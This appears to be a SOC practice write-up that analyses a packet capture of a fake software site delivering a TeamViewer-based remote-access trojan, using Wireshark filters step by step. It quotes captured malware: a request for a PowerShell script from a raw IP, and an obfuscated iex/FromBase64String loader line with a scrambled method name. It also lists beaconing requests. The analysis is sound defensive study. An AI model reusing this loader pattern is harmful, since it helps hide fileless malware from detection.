# Investigation — Case 04 (Fake Software Site → TeamViewer RAT)

## Step 1: Protocol Hierarchy and Conversations Overview

**Result:** Normal internal AD traffic (SMB, Kerberos, LDAP, RPC) between `10.1.17.x` hosts, correctly ruled out as noise (consistent with `bluemoontuesday.com` being the internal domain, same pattern as Case_03's `massfriction.com`).

**External standout:** Host `10.1.17.215` shows the largest single conversation (~5MB) to `5.252.153.241` on port 80, plus multiple connections to `45.125.66.32` on non-standard port `2917`.

---

## Step 2: DNS Resolution Check

**Filter used:**
```
dns and ip.addr == 5.252.153.241
```

**Result:** No DNS queries found for this IP.

**Finding:** 🔴 The connection to `5.252.153.241` went directly to a raw IP with no prior domain lookup — confirmed by the HTTP `Host:` header itself showing the bare IP address rather than a domain name. No DNS resolution before a connection is a red flag on its own, consistent with the reasoning applied in Case_008/012 (SOC-Triage-Practice) regarding raw-IP connections.

---

## Step 3: Follow the HTTP Stream

**Filter used:**
```
http and ip.addr == 5.252.153.241
```
Then: Follow → HTTP Stream.

**Result (key excerpt):**
```
GET /api/file/get-file/29842.ps1 HTTP/1.1
Host: 5.252.153.241

HTTP/1.1 200 OK
Content-Type: application/octet-stream

iex ([system.text.encoding]::UTF8.GetString([system.convert]::('F#r[o;m;B[a[s#e#6#4[S;t;r[i;n#g['.replace('#','').replace(';','').replace('[',''))(...base64...)))
```

**Findings:**
- 🔴 A `.ps1` PowerShell script was downloaded and its content uses `iex` (Invoke-Expression) to execute decoded content directly in memory — fileless execution, evading disk-based file scanning.
- 🔴 The method name `FromBase64String` is deliberately obfuscated by inserting junk characters (`#`, `;`, `[`) that are stripped at runtime — a targeted evasion technique against simple string-matching detection.

---

## Step 4: Identify the Beaconing Pattern

**Continued in the same HTTP stream:**
```
GET /1517096937 HTTP/1.1 → 404 Not Found
(repeated at ~5 second intervals, 13+ times)
...
GET /1517096937 HTTP/1.1 → 200 OK
Content-Type: application/octet-stream
Content-Length: 2761
```

**Finding:** 🔴 Repeated GET requests to the same resource path at a consistent ~5 second interval, receiving 404 until finally receiving a 200 OK, is a clear beaconing/polling pattern — the infected host repeatedly checking whether a next-stage payload is ready, conceptually identical to Case_01's RAT polling behavior, implemented here via HTTP GET retries instead of a persistent session.

---

## Step 5: Identify the Final Payload

**Filter used:**
```
http.request.method == "GET" and http.request.uri contains "TeamViewer"
```

**Result:** Multiple GET requests for `/api/file/get-file/TeamViewer`, `/api/file/get-file/Teamviewer_Resource_fr`, and `/api/file/get-file/TV`.

**Finding:** 🔴 The malware proceeds to request and presumably install components named after TeamViewer, a legitimate remote-access tool.

---

## Step 6: Confirm via DNS — Legitimate TeamViewer Infrastructure Contacted

**Filter used:**
```
dns.flags.response == 1 and not dns.qry.name contains "bluemoontuesday"
```

**Result:** DNS responses for `ping3.dyngate.com` and `tv-ns1.teamviewer.com` — both genuine, official TeamViewer-owned infrastructure domains.

**Finding:** 🔴 This confirms the infected host is attempting to establish connectivity with real TeamViewer servers, indicating an actual (not fake/corrupted) TeamViewer installation is being silently deployed — abusing legitimate remote-access software as a backdoor, the same technique family as Case_01's NetSupport Manager abuse.

---

## Summary of Findings

| Check | Result | Risk |
|---|---|---|
| Initial connection | Raw IP, no DNS resolution first | 🔴 High |
| Delivered script | Obfuscated, fileless PowerShell execution (IEX + Base64) | 🔴 High |
| Evasion technique | Method name deliberately scrambled to defeat string-matching detection | 🔴 High |
| Beaconing pattern | Repeated GET requests at ~5s intervals until payload ready | 🔴 High |
| Final payload | Legitimate TeamViewer software, silently deployed without consent | 🔴 High |
| DNS confirmation | Genuine TeamViewer infrastructure domains contacted | 🔴 High |
